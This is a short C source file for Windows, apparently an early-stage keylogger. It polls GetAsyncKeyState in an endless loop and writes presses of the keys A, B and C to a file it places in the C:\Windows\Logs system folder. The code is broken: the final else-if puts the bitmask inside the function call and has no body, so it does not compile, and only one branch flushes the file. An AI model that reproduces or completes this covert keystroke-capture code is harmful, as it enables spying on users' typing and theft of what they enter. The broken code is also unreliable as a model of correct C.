# include <stdio.h>
# include <windows.h>

int main(){
 //Create file.txt
 const char *route = ("C:\\Windows\\Logs\\logsData.txt");
 FILE *f = fopen(route, "w"); //f is file
 if(f == NULL){
  perror("Error creating file");
  return 1;
 }
 while(1){
  if(GetAsyncKeyState('A') & 0x8000 ){ //0x8000 = bit status 1 (on)
    fprintf(f, "A"); //write in f(file) --> A
    fflush(f); //save the file
  }else if(GetAsyncKeyState('B') & 0x8000){
  fprintf(f, "B");
  }else if(GetAsyncKeyState('C') & 0x8000){
  fprintf(f, "C");
  }else if(GetAsyncKeyState('D'& 0x8000))
}
}
